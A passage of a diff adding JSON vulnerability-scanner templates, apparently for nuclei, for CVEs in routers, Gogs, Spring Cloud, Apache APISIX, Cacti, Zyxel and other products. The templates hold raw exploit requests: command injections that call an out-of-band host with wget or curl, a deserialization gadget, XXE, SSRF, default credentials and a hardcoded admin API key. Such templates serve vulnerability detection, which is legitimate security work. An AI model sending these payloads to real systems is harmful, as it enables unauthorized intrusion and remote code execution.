+        "name": "Sunhillo SureLine <8.7.0.1.1 - Unauthenticated OS Command Injection",
+        "severity": "critical",
+        "tags": [
+          "cve2021",
+          "cve",
+          "sureline",
+          "rce",
+          "oast",
+          "sunhillo",
+          "kev",
+          "vkev"
+        ],
+        "cve": "CVE-2021-36380",
+        "prerequisite": false,
+        "cwe": "CWE-78"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "POST /cgi/networkDiag.cgi HTTP/1.1\nHost: {{Hostname}}\n\ncommand=2&ipAddr=&dnsAddr=$(wget+http://{{interactsh-url}})&interface=0&netType=0&scrFilter=&dstFilter=&fileSave=false&pcapSave=false&fileSize=\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2021-41419",
+      "info": {
+        "name": "QVIS NVR/DVR - Remote Code Execution",
+        "severity": "critical",
+        "tags": [
+          "cve",
+          "cve2021",
+          "qvisdvr",
+          "rce",
+          "deserialization",
+          "jsf",
+          "iot",
+          "oast"
+        ],
+        "cve": "CVE-2021-41419",
+        "prerequisite": false,
+        "cwe": "CWE-502"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "status",
+              "status": [
+                500
+              ]
+            }
+          ],
+          "raw": [
+            "GET /qvisdvr/ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n",
+            "POST /qvisdvr/index.faces;jsessionid={{token}} HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\njavax.faces.ViewState={{generate_java_gadget(\"commons-collections3.1\", \"wget http://{{interactsh-url}}\", \"base64\")}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2021-41653",
+      "info": {
+        "name": "TP-Link - OS Command Injection",
+        "severity": "critical",
+        "tags": [
+          "cve2021",
+          "cve",
+          "tplink",
+          "rce",
+          "router",
+          "tp-link",
+          "vkev",
+          "vuln"
+        ],
+        "cve": "CVE-2021-41653",
+        "prerequisite": false,
+        "cwe": "CWE-94"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "interactsh_request",
+              "words": [
+                "User-Agent: {{useragent}}"
+              ]
+            }
+          ],
+          "raw": [
+            "POST /cgi?2 HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/plain\nReferer: http://{{Hostname}}/mainFrame.htm\nCookie: Authorization=Basic YWRtaW46YWRtaW4=\n\n[IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,6\ndataBlockSize=64\ntimeout=1\nnumberOfRepetitions=4\nhost=$(echo 127.0.0.1; curl http://{{interactsh-url}} -H 'User-Agent: {{useragent}}')\nX_TP_ConnName=ewan_ipoe_d\ndiagnosticsState=Requested\n",
+            "POST /cgi?7 HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/plain\nReferer: http://{{Hostname}}/mainFrame.htm\nCookie: Authorization=Basic YWRtaW46YWRtaW4=\n\n[ACT_OP_IPPING#0,0,0,0,0,0#0,0,0,0,0,0]0,0\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2021-45382",
+      "info": {
+        "name": "D-Link - Remote Command Execution",
+        "severity": "critical",
+        "tags": [
+          "cve2021",
+          "cve",
+          "dlink",
+          "kev",
+          "rce",
+          "vkev",
+          "vuln"
+        ],
+        "cve": "CVE-2021-45382",
+        "prerequisite": false,
+        "cwe": "CWE-78"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "interactsh_request",
+              "words": [
+                "User-Agent: curl"
+              ]
+            }
+          ],
+          "method": "POST",
+          "path": [
+            "/ddns_check.ccp"
+          ],
+          "body": "ccp_act=doCheck&ddnsHostName=;curl https://{{interactsh-url}};&ddnsUsername={{string1}}&ddnsPassword={{string2}}"
+        }
+      ]
+    },
+    {
+      "id": "cve-2021-45967",
+      "info": {
+        "name": "Pascom CPS Server-Side Request Forgery",
+        "severity": "critical",
+        "tags": [
+          "cve",
+          "cve2021",
+          "pascom",
+          "ssrf",
+          "pascom_cloud_phone_system",
+          "vkev",
+          "vuln"
+        ],
+        "cve": "CVE-2021-45967",
+        "prerequisite": false,
+        "cwe": "CWE-22"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "/services/pluginscript/..;/..;/..;/getFavicon?host={{interactsh-url}}"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2022-0415",
+      "info": {
+        "name": "Gogs <0.12.6 - Remote Command Execution",
+        "severity": "high",
+        "tags": [
+          "cve",
+          "cve2022",
+          "rce",
+          "gogs",
+          "authenticated",
+          "huntr",
+          "intrusive",
+          "vuln"
+        ],
+        "cve": "CVE-2022-0415",
+        "prerequisite": false,
+        "cwe": "CWE-434,CWE-20"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "dns",
+                "http"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "body_1",
+              "words": [
+                "content=\"Gogs"
+              ]
+            }
+          ],
+          "raw": [
+            "GET /user/login HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /user/login HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\n_csrf={{csrf}}&user_name={{username}}&password={{url_encode(password)}}\n",
+            "GET /repo/create HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /repo/create HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\n_csrf={{auth_csrf}}&user_id=1&repo_name={{randstr}}&description=test&gitignores=&license=&readme=Default&auto_init=on\n",
+            "POST /{{username}}/{{randstr}}/upload-file HTTP/1.1\nHost: {{Hostname}}\nAccept: application/json\nX-Requested-With: XMLHttpRequest\nX-Csrf-Token: {{auth_csrf}}\nContent-Type: multipart/form-data; boundary=---------------------------313811965223810628771946318395\n\n-----------------------------313811965223810628771946318395\nContent-Disposition: form-data; name=\"file\"; filename=\"config\"\nContent-Type: application/octet-stream\n\n[core]\n    repositoryformatversion = 0\n    filemode = true\n    bare = false\n    logallrefupdates = true\n    ignorecase = true\n    precomposeunicode = true\n    sshCommand = curl http://{{interactsh-url}} -I\n[remote \"origin\"]\n    url = git@github.com:torvalds/linux.git\n    fetch = +refs/heads/*:refs/remotes/origin/*\n[branch \"master\"]\n    remote = origin\n    merge = refs/heads/master\n-----------------------------313811965223810628771946318395--\n",
+            "POST /{{username}}/{{randstr}}/_upload/master/ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\n_csrf={{auth_csrf}}&tree_path=/.git/&files={{uuid}}&commit_summary=&commit_message=&commit_choice=direct&new_branch_name=\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2022-0870",
+      "info": {
+        "name": "Gogs <0.12.5 - Server-Side Request Forgery",
+        "severity": "medium",
+        "tags": [
+          "cve",
+          "cve2022",
+          "ssrf",
+          "gogs",
+          "authenticated",
+          "huntr",
+          "vuln"
+        ],
+        "cve": "CVE-2022-0870",
+        "prerequisite": false,
+        "cwe": "CWE-918"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "dns",
+                "http"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "body_1",
+              "words": [
+                "content=\"Gogs"
+              ]
+            }
+          ],
+          "raw": [
+            "GET /user/login HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /user/login HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\n_csrf={{csrf}}&user_name={{username}}&password={{url_encode(password)}}\n",
+            "GET /repo/migrate HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /repo/migrate HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\n_csrf={{auth_csrf}}&clone_addr=https%3A%2F%2F{{interactsh-url}}&auth_username=&auth_password=&uid=1&repo_name={{randstr}}&description=test\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2022-1398",
+      "info": {
+        "name": "External Media without Import <=1.1.2 - Authenticated Blind Server-Side Request Forgery",
+        "severity": "medium",
+        "tags": [
+          "cve2022",
+          "cve",
+          "ssrf",
+          "wordpress",
+          "wp-plugin",
+          "wp",
+          "wpscan",
+          "external-media-without-import"
+        ],
+        "cve": "CVE-2022-1398",
+        "prerequisite": false,
+        "cwe": "CWE-918"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "body_2",
+              "words": [
+                "external-media-without-import"
+              ]
+            }
+          ],
+          "raw": [
+            "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nlog={{username}}&pwd={{password}}&wp-submit=Log+In\n",
+            "GET /wp-admin/upload.php HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /wp-admin/admin-post.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nurls=http%3A%2F%2F{{interactsh-url}}&width=&height=&mime-type=&action=add_external_media_without_import\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2022-22963",
+      "info": {
+        "name": "Spring Cloud - Remote Code Execution",
+        "severity": "critical",
+        "tags": [
+          "cve",
+          "cve2022",
+          "vulhub",
+          "springcloud",
+          "rce",
+          "kev",
+          "vmware",
+          "vkev"
+        ],
+        "cve": "CVE-2022-22963",
+        "prerequisite": false,
+        "cwe": "CWE-94,CWE-917"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http",
+                "dns"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "status",
+              "status": [
+                500
+              ]
+            }
+          ],
+          "raw": [
+            "POST /functionRouter HTTP/1.1\nHost: {{Hostname}}\nspring.cloud.function.routing-expression: T(java.net.InetAddress).getByName(\"{{interactsh-url}}\")\nContent-Type: application/x-www-form-urlencoded\n\n{{rand_base(8)}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2022-22972",
+      "info": {
+        "name": "VMware Workspace ONE Access/Identity Manager/vRealize Automation - Authentication Bypass",
+        "severity": "critical",
+        "tags": [
+          "cve2022",
+          "cve",
+          "vmware",
+          "auth-bypass",
+          "oast",
+          "vuln",
+          "vkev"
+        ],
+        "cve": "CVE-2022-22972",
+        "prerequisite": false,
+        "cwe": "CWE-287"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "header",
+              "words": [
+                "HZN="
+              ]
+            },
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "status",
+              "status": [
+                302
+              ]
+            }
+          ],
+          "raw": [
+            "GET /vcac/ HTTP/1.1\nHost: {{Hostname}}\n",
+            "GET /vcac/?original_uri={{RootURL}}%2Fvcac HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /SAAS/auth/login/embeddedauthbroker/callback HTTP/1.1\nHost: {{interactsh-url}}\nContent-type: application/x-www-form-urlencoded\n\nprotected_state={{protected_state}}&userstore={{userstore}}&username=administrator&password=horizon&userstoreDisplay={{userstoreDisplay}}&horizonRelayState={{horizonRelayState}}&stickyConnectorId={{stickyConnectorId}}&action=Sign+in\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2022-23881",
+      "info": {
+        "name": "ZZZCMS zzzphp 2.1.0 - Remote Code Execution",
+        "severity": "critical",
+        "tags": [
+          "cve",
+          "cve2022",
+          "rce",
+          "zzzphp",
+          "zzzcms",
+          "vuln"
+        ],
+        "cve": "CVE-2022-23881",
+        "prerequisite": false,
+        "cwe": "CWE-77"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "status",
+              "status": [
+                500
+              ]
+            }
+          ],
+          "raw": [
+            "GET /?location=search HTTP/1.1\nHost: {{Hostname}}\nCookies: keys={if:=`certutil -urlcache -split -f https://{{interactsh-url}}/poc`}{end if}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2022-24112",
+      "info": {
+        "name": "Apache APISIX - Remote Code Execution",
+        "severity": "critical",
+        "tags": [
+          "cve",
+          "cve2022",
+          "apache",
+          "rce",
+          "apisix",
+          "oast",
+          "kev",
+          "intrusive"
+        ],
+        "cve": "CVE-2022-24112",
+        "prerequisite": false,
+        "cwe": "CWE-290"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body_1",
+              "words": [
+                "\"reason\":\"OK\"",
+                "\"status\":200"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "raw": [
+            "POST /apisix/batch-requests HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\n\n{\n  \"headers\":{\n    \"X-Real-IP\":\"127.0.0.1\",\n    \"Content-Type\":\"application/json\"\n  },\n  \"timeout\":1500,\n  \"pipeline\":[\n    {\n      \"method\":\"PUT\",\n      \"path\":\"/apisix/admin/routes/index?api_key=edd1c9f034335f136f87ad84b625c8f1\",\n      \"body\":\"{\\r\\n \\\"name\\\": \\\"test\\\", \\\"method\\\": [\\\"GET\\\"],\\r\\n \\\"uri\\\": \\\"/api/{{randstr}}\\\",\\r\\n \\\"upstream\\\":{\\\"type\\\":\\\"roundrobin\\\",\\\"nodes\\\":{\\\"httpbin.org:80\\\":1}}\\r\\n,\\r\\n\\\"filter_func\\\": \\\"function(vars) os.execute('curl {{interactsh-url}}/`whoami`'); return true end\\\"}\"\n    }\n  ]\n}\n",
+            "GET /api/{{randstr}} HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2022-24129",
+      "info": {
+        "name": "Shibboleth OIDC OP <3.0.4 - Server-Side Request Forgery",
+        "severity": "high",
+        "tags": [
+          "cve",
+          "cve2022",
+          "ssrf",
+          "oidc",
+          "shibboleth",
+          "identity_provider",
+          "vuln"
+        ],
+        "cve": "CVE-2022-24129",
+        "prerequisite": false,
+        "cwe": "CWE-918"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "interactsh_request",
+              "words": [
+                "ShibbolethIdp"
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "/idp/profile/oidc/authorize?client_id=demo_rp&request_uri=https://{{interactsh-url}}"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2022-2486",
+      "info": {
+        "name": "Wavlink WN535K2/WN535K3 - OS Command Injection",
+        "severity": "critical",
+        "tags": [
+          "cve2022",
+          "cve",
+          "iot",
+          "wavlink",
+          "router",
+          "rce",
+          "oast",
+          "vkev"
+        ],
+        "cve": "CVE-2022-2486",
+        "prerequisite": false,
+        "cwe": "CWE-78"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "status",
+              "status": [
+                500
+              ]
+            }
+          ],
+          "raw": [
+            "GET /cgi-bin/mesh.cgi?page=upgrade&key=;%27wget+http://{{interactsh-url}};%27 HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2022-2488",
+      "info": {
+        "name": "Wavlink WN535K2/WN535K3 - OS Command Injection",
+        "severity": "critical",
+        "tags": [
+          "cve",
+          "cve2022",
+          "iot",
+          "wavlink",
+          "router",
+          "rce",
+          "oast",
+          "vkev"
+        ],
+        "cve": "CVE-2022-2488",
+        "prerequisite": false,
+        "cwe": "CWE-78"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "status",
+              "status": [
+                500
+              ]
+            }
+          ],
+          "raw": [
+            "GET /cgi-bin/touchlist_sync.cgi?IP=;wget+http://{{interactsh-url}}; HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2022-28219",
+      "info": {
+        "name": "Zoho ManageEngine ADAudit Plus <7600 - XML Entity Injection/Remote Code Execution",
+        "severity": "critical",
+        "tags": [
+          "cve",
+          "cve2022",
+          "xxe",
+          "rce",
+          "zoho",
+          "manageengine",
+          "unauth",
+          "zohocorp"
+        ],
+        "cve": "CVE-2022-28219",
+        "prerequisite": false,
+        "cwe": "CWE-611"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "ManageEngine"
+              ]
+            }
+          ],
+          "method": "POST",
+          "path": [
+            "/api/agent/tabs/agentData"
+          ],
+          "body": "[\n  {\n    \"DomainName\": \"{{Host}}\",\n    \"EventCode\": 4688,\n    \"EventType\": 0,\n    \"TimeGenerated\": 0,\n    \"Task Content\": \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?><! foo [ <!ENTITY % xxe SYSTEM \\\"http://{{interactsh-url}}\\\"> %xxe; ]>\"\n  }\n]\n",
+          "headers": {
+            "Content-Type": "application/json"
+          }
+        }
+      ]
+    },
+    {
+      "id": "cve-2022-30525",
+      "info": {
+        "name": "Zyxel Firewall - OS Command Injection",
+        "severity": "critical",
+        "tags": [
+          "cve2022",
+          "cve",
+          "packetstorm",
+          "zyxel",
+          "firewall",
+          "unauth",
+          "kev",
+          "msf"
+        ],
+        "cve": "CVE-2022-30525",
+        "prerequisite": false,
+        "cwe": "CWE-78"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "status",
+              "status": [
+                500
+              ]
+            }
+          ],
+          "raw": [
+            "POST /ztp/cgi-bin/handler HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\"command\":\"setWanPortSt\",\"proto\":\"dhcp\",\"port\":\"4\",\"vlan_tagged\":\"1\",\"vlanid\":\"5\",\"mtu\":\"; curl {{interactsh-url}};\",\"data\":\"hi\"}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2022-46169",
+      "info": {
+        "name": "Cacti <=1.2.22 - Remote Command Injection",
+        "severity": "critical",
+        "tags": [
+          "cve",
+          "cve2022",
+          "auth-bypass",
+          "cacti",
+          "kev",
+          "rce",
+          "unauth",
+          "vkev"
+        ],
+        "cve": "CVE-2022-46169",
+        "prerequisite": false,
+        "cwe": "CWE-78,CWE-74"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "\"value\":",
+                "\"local_data_id\":"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "interactsh_request",
+              "words": [
+                "User-Agent: {{useragent}}"
+              ]
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "raw": [
+            "GET /remote_agent.php?action=polldata&local_data_ids[0]=1&host_id=1&poller_id=;curl%20{{interactsh-url}}%20-H%20'User-Agent%3a%20{{useragent}}'; HTTP/1.1\nHost: {{Hostname}}\nX-Forwarded-For: 127.0.0.1\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2023-27159",
+      "info": {
+        "name": "Appwrite <=1.2.1 - Server-Side Request Forgery",
+        "severity": "high",
+        "tags": [
+          "cve2023",
+          "cve",
+          "appwrite",
+          "ssrf",
+          "oast",
+          "vkev",
+          "vuln"
+        ],
+        "cve": "CVE-2023-27159",
+        "prerequisite": false,
+        "cwe": "CWE-918"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "interactsh_request",
+              "words": [
+                "User-Agent: Appwrite-Server"
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "/v1/avatars/favicon?url=http://{{interactsh-url}}"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2023-29827",
+      "info": {
+        "name": "Embedded JavaScript(EJS) 3.1.6 - Template Injection",
+        "severity": "critical",
+        "tags": [
+          "cve",
+          "cve2023",
+          "ssti",
+          "rce",
+          "ejs",
+          "oast",
+          "node.js",
+          "vuln"
+        ],
+        "cve": "CVE-2023-29827",
+        "prerequisite": false,
+        "cwe": "CWE-74"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "You are viewing page number"
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "/page?settings[view%20options][closeDelimiter]=x%22)%3bprocess.mainModule.require(%27child_process%27).execSync(%27wget+http://{{interactsh-url}}%27)%3b//"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2023-3368",
+      "info": {
+        "name": "Chamilo LMS <= v1.11.20 Unauthenticated Command Injection",
+        "severity": "critical",
+        "tags": [
+          "cve2023",
+          "cve",
+          "chamilo",
+          "unauth",
+          "cmd",
+          "rce",
+          "vkev",
+          "vuln"
+        ],
+        "cve": "CVE-2023-3368",
+        "prerequisite": false,
+        "cwe": "CWE-78"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "wsConvertPptResponse"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "method": "POST",
+          "path": [
+            "/main/webservices/additional_webservices.php"
+          ],
+          "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ns1=\"{{BaseURL}}\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:ns2=\"http://xml.apache.org/xml-soap\" xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n  <SOAP-ENV:Body>\n    <ns1:wsConvertPpt>\n      <param0 xsi:type=\"ns2:Map\">\n        <item>\n          <key xsi:type=\"xsd:string\">file_data</key>\n          <value xsi:type=\"xsd:string\"></value>\n        </item>\n        <item>\n          <key xsi:type=\"xsd:string\">file_name</key>\n          <value xsi:type=\"xsd:string\">$(curl http://{{interactsh-url}}/)</value>\n        </item>\n        <item>\n          <key xsi:type=\"xsd:string\">service_ppt2lp_size</key>\n          <value xsi:type=\"xsd:string\">720x540</value>\n        </item>\n      </param0>\n    </ns1:wsConvertPpt>\n  </SOAP-ENV:Body>\n</SOAP-ENV:Envelope>\n",
+          "headers": {
+            "Content-Type": "application/xml"
+          }
+        }
+      ]
+    },
+    {
+      "id": "cve-2023-6018",
+      "info": {
+        "name": "Mlflow - Arbitrary File Write",
+        "severity": "critical",
+        "tags": [
+          "cve",
+          "cve2023",
+          "mlflow",
+          "oss",
+          "rce",
+          "intrusive",
+          "lfprojects",
+          "vuln"
+        ],
+        "cve": "CVE-2023-6018",
+        "prerequisite": false,
+        "cwe": "CWE-78"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "body_1",
+              "words": [
+                "\"registered_model\":",
+                "\"name\":"
+              ],
+              "condition": "and"
+            }
+          ],
+          "raw": [
+            "POST /ajax-api/2.0/mlflow/registered-models/create HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\"name\": \"{{model_name}}\"}\n",
+            "POST /ajax-api/2.0/mlflow/model-versions/create HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\"name\": \"{{model_name}}\", \"source\": \"http://{{interactsh-url}}/api/2.0/mlflow-artifacts/artifacts/\"}\n",
+            "POST /ajax-api/2.0/mlflow/model-versions/create HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\"name\": \"{{model_name}}\", \"source\": \"models:/{{model_name}}/1\"}\n",
+            "GET /model-versions/get-artifact?path=random&name={{model_name}}&version=2 HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2024-29895",
+      "info": {
+        "name": "Cacti cmd_realtime.php - Command Injection",
+        "severity": "critical",
+        "tags": [
+          "cve",
+          "cve2024",
+          "cacti",
+          "rce",
+          "vkev",
+          "vuln"
+        ],
+        "cve": "CVE-2024-29895",
+        "prerequisite": false,
+        "cwe": "CWE-77"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "interactsh_request",
+              "words": [
+                "User-Agent: curl"
+              ]
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "/cacti/cmd_realtime.php?1+1&&curl%20{{interactsh-url}}+1+1+1"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2024-33832",
+      "info": {
+        "name": "OneNav v0.9.35-20240318 - Server-Side Request Forgery (SSRF)",
+        "severity": "medium",
+        "tags": [
+          "cve",
+          "cve2024",
+          "ssrf",
+          "onenav",
+          "oast",
+          "authenticated",
+          "vuln"
+        ],
+        "cve": "CVE-2024-33832",
+        "prerequisite": false,
+        "cwe": "CWE-918"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "title\":",
+                "description\":"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "word",
+              "part": "content_type",
+              "words": [
+                "application/json"
+              ]
+            }
+          ],
+          "raw": [
+            "POST /index.php?c=login&check=login HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\n\nuser={{username}}&password={{password}}\n",
+            "POST /index.php?c=api&method=get_link_info HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\n\nurl=http://{{interactsh-url}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2024-4885",
+      "info": {
+        "name": "Progress Software WhatsUp Gold GetFileWithoutZip Directory Traversal - Remote Code Execution",
+        "severity": "critical",
+        "tags": [
+          "cve",
+          "cve2024",
+          "rce",
+          "progress",
+          "whatsup",
+          "lfi",
+          "kev",
+          "vkev"
+        ],
+        "cve": "CVE-2024-4885",
+        "prerequisite": false,
+        "cwe": "CWE-22"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "interactsh_request",
+              "words": [
+                "sPassword"
+              ]
+            }
+          ],
+          "raw": [
